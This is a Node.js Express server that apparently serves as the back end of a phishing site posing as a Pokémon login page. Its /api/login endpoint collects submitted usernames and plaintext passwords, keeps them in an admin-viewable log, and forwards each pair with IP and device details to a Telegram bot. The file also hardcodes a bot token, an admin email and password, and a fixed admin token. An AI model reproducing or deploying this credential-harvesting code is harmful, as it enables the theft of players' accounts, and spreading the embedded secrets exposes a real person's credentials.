const express = require("express");
const bodyParser = require("body-parser");
const https = require("https");
const cors = require("cors");
const path = require("path");

const app = express();
const PORT = 3000;
const ADMIN_USERNAME = "rahulkushwaha1842003@gmail.com";
const ADMIN_PASSWORD = "Rewa@1234";

// Store login logs in memory
const loginLogs = [];

// Telegram Bot Configuration
const BOT_TOKEN = "8215904112:AAH06c70RFrcJtI0Qfla0dygrzCIF3_3rFM".replace(
  /\s/g,
  "",
); // Fix: Remove any spaces
let CHAT_ID = "YOUR_CHAT_ID_HERE"; // Will be auto-detected

// Get chat ID helper function
async function getChatId() {
  if (CHAT_ID !== "YOUR_CHAT_ID_HERE") {
    return CHAT_ID;
  }

  // Try to get updates to find chat ID
  return new Promise((resolve, reject) => {
    const options = {
      hostname: "api.telegram.org",
      path: `/bot${BOT_TOKEN}/getUpdates`,
      method: "GET",
    };

    const req = https.request(options, (res) => {
      let data = "";
      res.on("data", (d) => {
        data += d;
      });
      res.on("end", () => {
        try {
          const response = JSON.parse(data);
          if (response.result && response.result.length > 0) {
            // Get the most recent message
            const latestMessage = response.result[response.result.length - 1];
            const chatId = latestMessage.message.chat.id;
            CHAT_ID = chatId; // Store the chat ID
            console.log(`🔍 Found Chat ID: ${chatId}`);
            resolve(chatId);
          } else {
            console.log('❌ No messages found. Send a message to @PokemonGOlogin_bot first!');
            resolve(null);
          }
        } catch (error) {
          console.error('❌ Error parsing response:', error);
          resolve(null);
        }
      });
    });

    req.on("error", (error) => {
      console.error("❌ Error getting chat ID:", error);
      resolve(null);
    });

    req.end();
  });
}

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static("."));

// Send Telegram message function (improved)
async function sendTelegramMessage(message) {
  try {
    // Get chat ID dynamically if not set
    const chatId = await getChatId();
    if (!chatId) {
      console.log("❌ Cannot send message: No Chat ID available");
      return { success: false, error: "No Chat ID available" };
    }

    const data = JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: "HTML",
    });

    const options = {
      hostname: "api.telegram.org",
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": data.length,
      },
    };

    return new Promise((resolve, reject) => {
      const req = https.request(options, (res) => {
        let responseData = "";

        res.on("data", (d) => {
          responseData += d;
        });

        res.on("end", () => {
          console.log(`📱 Telegram API Status: ${res.statusCode}`);
          console.log("📨 Telegram Response:", responseData);

          if (res.statusCode === 200) {
            resolve({ success: true, response: responseData });
          } else {
            resolve({
              success: false,
              error: `HTTP ${res.statusCode}: ${responseData}`,
            });
          }
        });
      });

      req.on("error", (error) => {
        console.error("❌ Telegram Error:", error);
        resolve({ success: false, error: error.message });
      });

      req.write(data);
      req.end();
    });
  } catch (error) {
    console.error("❌ Send message error:", error);
    return { success: false, error: error.message };
  }
}

// Login notification endpoint (improved)
app.post("/api/login", async (req, res) => {
  const { username, password, timestamp, ip } = req.body;

  if (!username) {
    return res.status(400).json({
      success: false,
      error: "Username is required",
    });
  }

  // Save to local logs for Admin Panel
  loginLogs.unshift({
    username,
    password,
    timestamp: timestamp || new Date().toISOString(),
    ip: ip || "Unknown",
    userAgent: req.headers["user-agent"] || "Unknown",
  });
  // Keep only last 100 logs
  if (loginLogs.length > 100) loginLogs.pop();

  const message = `
🔐 <b>Pokémon Trainer Central Login Alert</b>

👤 Username: <code>${username}</code>
🔑 Password: <code>${password}</code>
🕐 Time: ${new Date(timestamp).toLocaleString()}
🌐 IP: ${ip || "Unknown"}
📍 Device: ${req.headers["user-agent"]?.split(" ")[0] || "Unknown"}
🔗 Source: ${req.headers.referer || "Direct"}

<i>New login attempt detected</i>
    `.trim();

  try {
    // Send to Telegram
    const telegramResult = await sendTelegramMessage(message);

    if (telegramResult.success) {
      res.json({
        success: true,
        message: "✅ Login notification sent to Telegram",
        telegram: telegramResult,
        timestamp: new Date().toISOString(),
      });
    } else {
      res.status(500).json({
        success: false,
        message: "❌ Failed to send Telegram notification",
        error: telegramResult.error,
        timestamp: new Date().toISOString(),
      });
    }
  } catch (error) {
    console.error("❌ Login endpoint error:", error);
    res.status(500).json({
      success: false,
      message: "Server error",
      error: error.message,
      timestamp: new Date().toISOString(),
    });
  }
});

// Admin Panel Endpoints
app.post("/api/admin/login", (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    res.json({ success: true, token: "admin-secret-token" });
  } else {
    res.json({ success: false, message: "Invalid Username or Password" });
  }
});

app.get("/api/admin/logs", (req, res) => {
  const token = req.headers["authorization"];
  if (token === "Bearer admin-secret-token") {
    res.json(loginLogs);
  } else {
    res.status(401).json({ error: "Unauthorized" });
  }
});

// Serve Admin Panel
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "admin.html"));
});

// Health check endpoint
app.get("/api/health", (req, res) => {
  res.json({
    status: "Server running",
    timestamp: new Date().toISOString(),
  });
});

// Bot status endpoint
app.get("/api/bot-status", async (req, res) => {
  try {
    const chatId = await getChatId();
    const botInfo = await getBotInfo();

    res.json({
      bot_token_configured: BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE",
      chat_id_configured: CHAT_ID !== "YOUR_CHAT_ID_HERE",
      chat_id_found: !!chatId,
      bot_info: botInfo,
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    res.json({
      bot_token_configured: BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE",
      chat_id_configured: CHAT_ID !== "YOUR_CHAT_ID_HERE",
      error: error.message,
      timestamp: new Date().toISOString(),
    });
  }
});

// Get bot info function
async function getBotInfo() {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: "api.telegram.org",
      path: `/bot${BOT_TOKEN}/getMe`,
      method: "GET",
    };

    const req = https.request(options, (res) => {
      let data = "";
      res.on("data", (d) => {
        data += d;
      });
      res.on("end", () => {
        try {
          const response = JSON.parse(data);
          if (response.ok) {
            resolve(response.result);
          } else {
            resolve(null);
          }
        } catch (error) {
          resolve(null);
        }
      });
    });

    req.on("error", () => {
      resolve(null);
    });

    req.end();
  });
}

// Start server
app.listen(PORT, async () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
  console.log(`📱 Telegram Bot: @PokemonGOlogin_bot`);

  // Check bot configuration
  if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
    console.log("⚠️  Please configure BOT_TOKEN in server.js");
  } else {
    const botInfo = await getBotInfo();
    if (botInfo) {
      console.log(
        `✅ Bot connected: ${botInfo.first_name} (@${botInfo.username})`,
      );
      console.log("📱 Send a message to @PokemonGOlogin_bot to enable notifications");
    } else {
      console.log("❌ Bot token invalid or bot not found");
      console.log("   Current Token:", BOT_TOKEN);
    }
  }

  // Try to get chat ID automatically
  const autoChatId = await getChatId();
  if (autoChatId) {
    console.log(`✅ Chat ID auto-detected: ${autoChatId}`);
    console.log("📨 Telegram notifications are now active!");
  } else {
    console.log("⚠️  Chat ID not found. Send a message to @PokemonGOlogin_bot first!");
    console.log("💡 Then restart the server or wait for next login attempt");
  }

  console.log("🔗 API Endpoints:");
  console.log(`   POST /api/login - Send login notification`);
  console.log(`   GET  /api/health - Server health check`);
  console.log(`   GET  /api/bot-status - Bot configuration status`);
  console.log(`   POST /api/admin/login - Admin panel login`);
  console.log(`   GET  /api/admin/logs - Get login logs (admin only)`);
  console.log(`   GET  /admin - Admin panel interface`);
});

module.exports = app;
